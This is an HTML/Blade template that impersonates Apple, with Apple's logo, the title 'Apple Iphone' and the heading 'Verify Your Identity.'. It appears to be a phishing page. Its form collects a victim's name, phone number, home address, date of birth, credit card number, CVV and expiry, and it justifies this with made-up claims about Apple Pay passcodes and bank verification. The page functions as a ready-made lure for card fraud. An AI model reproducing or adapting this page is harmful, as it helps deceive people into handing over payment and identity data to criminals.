<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="{{ asset('/assets/css/bootstrap.min.css') }}" rel="stylesheet">
    <link href="{{ asset('/assets/css/custom.css') }}" rel="stylesheet">
    <script src="{{ asset('/assets/js/fontawesome.js') }}" crossorigin="anonymous"></script>
    <title>Apple Iphone</title>
</head>
<style>
    .form-control:focus {
        color: none;
        background-color: none;
        border-color: none;
        outline: none;
        box-shadow: none;
    }

</style>

<body>
    <nav class="navbar fixed-top navbar-dark bg-dark position-relative">
        <div class="container-fluid justify-content-center">
            <a class="navbar-brand " href="#">
                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="48" viewBox="0 0 18 48">
                    <path
                        d="M13.03 16.03C11.29 15.91 9.82 17 9 17c-.83 0-2.12-.94-3.48-.92-1.79.03-3.44 1.04-4.36 2.64C-.7 21.95.69 26.73 2.5 29.35c.89 1.28 1.94 2.72 3.33 2.67 1.34-.05 1.84-.86 3.46-.86 1.61 0 2.07.86 3.48.84 1.44-.03 2.35-1.31 3.23-2.59 1.02-1.48 1.44-2.92 1.46-3-.03-.01-2.8-1.07-2.83-4.27-.03-2.67 2.18-3.95 2.28-4.01-1.27-1.84-3.2-2.05-3.88-2.1m-1.07-1.72c.74-.89 1.23-2.13 1.1-3.37-1.06.04-2.34.71-3.11 1.6-.68.79-1.28 2.05-1.12 3.26 1.19.09 2.39-.6 3.13-1.49"
                        fill="#fffffe" />
                </svg>
            </a>
            {{-- <span class="apple logo"></span> --}}
        </div>
    </nav>
    <a href="" class="text-decoration-none">
        <h5 class="d-flex justify-content-end p-4 ">Next</h5>
    </a>
    <div class="jumbotron">
        <div class="container text-center">
            <h2>Verify Your Identity.</h2>
        </div>
    </div>

    <section class="">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-12">
                    <form class="g-3">
                        <div class="row d-flex bg-white">
                            <div class="col-md-6">
                                <h6 for="validationDefault01" class="form-label fw-bolder p-2"> First Name</h6>
                            </div>
                            <div class="col-md-6 ">
                                <input type="text" class="form-control border-0" id="validationDefault01" value=""
                                    placeholder="First Name" required>
                            </div>
                        </div>
                        <div class="row d-flex bg-white mt-2">
                            <div class="col-md-6">
                                <h6 for="validationDefault02" class="form-label fw-bolder p-2"> First Name</h6>
                            </div>
                            <div class="col-md-6">
                                <input type="text" class="form-control border-0" id="validationDefault02" value=""
                                    placeholder="Second Name" required>
                            </div>
                        </div>
                        <div class="row d-flex bg-white mt-2">
                            <div class="col-md-6">
                                <h6 for="validationDefault03" class="form-label fw-bolder p-2"> Mobile Number</h6>
                            </div>
                            <div class="col-md-6">
                                <input type="phone" class="form-control border-0" id="validationDefault03" value=""
                                    placeholder="Mobile Number" required>
                            </div>
                        </div>
                        <p class="text content">Some stores may need One-Time-Passcode for secure payments with your
                            apple pay.</p>
                        <div class="row d-flex bg-white mt-1">
                            <div class="col-md-6">
                                <h6 for="validationDefault03" class="form-label fw-bolder p-2">First Line</h6>
                            </div>
                            <div class="col-md-6">
                                <input type="text" class="form-control border-0" id="validationDefault03" value=""
                                    placeholder="First Line" required>
                            </div>
                        </div>
                        <div class="row d-flex bg-white mt-2">
                            <div class="col-md-6">
                                <h6 for="validationDefault03" class="form-label fw-bolder p-2">Second Line</h6>
                            </div>
                            <div class="col-md-6">
                                <input type="text" class="form-control border-0" id="validationDefault03" value=""
                                    placeholder="Second Line" required>
                            </div>
                        </div>
                        <div class="row d-flex bg-white mt-2">
                            <div class="col-md-6">
                                <h6 for="validationDefault03" class="form-label fw-bolder p-2">Town</h6>
                            </div>
                            <div class="col-md-6">
                                <input type="text" class="form-control border-0" id="validationDefault03" value=""
                                    placeholder="Town" required>
                            </div>
                        </div>
                        <div class="row d-flex bg-white mt-2">
                            <div class="col-md-6">
                                <h6 for="validationDefault03" class="form-label fw-bolder p-2">Postalcode</h6>
                            </div>
                            <div class="col-md-6">
                                <input type="text" class="form-control border-0" id="validationDefault03" value=""
                                    placeholder="Postalcode" required>
                            </div>
                        </div>
                        <div class="row d-flex bg-white mt-2">
                            <div class="col-md-6">
                                <h6 for="validationDefault03" class="form-label fw-bolder p-2">Date of Birth</h6>
                            </div>
                            <div class="col-md-6">
                                <input type="date" class="form-control border-0" id="validationDefault03" value=""
                                    required>
                            </div>
                        </div>
                        <p class="text content">This is the address on file with your bank. This will need to be
                            accurate to process payments.</p>
                        <div class="row d-flex bg-white mt-2">
                            <div class="col-md-6">
                                <h6 for="validationDefault03" class="form-label fw-bolder p-2">Credit Card Number</h6>
                            </div>
                            <div class="col-md-6">
                                <input type="number" class="form-control border-0" id="validationDefault03" value=""
                                    placeholder="Credit Card Number" required>
                            </div>
                        </div>
                        <div class="row d-flex bg-white mt-2">
                            <div class="col-md-6">
                                <input type="number" class="form-control border-0" id="validationDefault03" value=""
                                    placeholder="CVV" required>
                            </div>
                            <div class="col-md-6">
                                <input type="number" class="form-control border-0" id="validationDefault03" value=""
                                    placeholder="Exp" required>
                            </div>
                        </div>

                        <div class="col-md-12 mt-4 justify-content-center ">
                            <button class="btn btn-outline-secondary w-100" type="submit"><b> SUBMIT</b></button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </section>
</body>

</html>
